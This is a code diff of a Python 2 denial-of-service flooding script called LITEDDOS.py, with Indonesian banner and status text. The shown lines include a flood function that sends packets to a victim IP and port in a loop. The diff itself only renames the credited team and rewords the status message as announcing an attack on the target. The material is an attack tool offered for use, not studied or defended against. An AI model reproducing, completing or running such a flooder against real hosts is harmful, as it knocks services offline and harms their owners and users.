@@ -9,7 +9,7 @@ def usage():
     print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<ip> <port> <packet> \033[1;32m   #"
     print "#                                                       #"
     print "#\033[1;91mPembuat:MR.L4M3R  \033[1;32m##      ###       ##                #"
-    print "#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #"
+    print "#\033[1;91mTeam   : SUMBER CYBER TEAM        \033[1;32m##     #          ##                #"
     print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
     print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
     print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
@@ -34,7 +34,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim packet \033[1;32m%s \033[1;91msitus telah down \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mMemulai Serangan Ke \033[1;32m%s \033[1;91mmengirim serangan  \033[1;32m%s \033[1;91mkepada port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
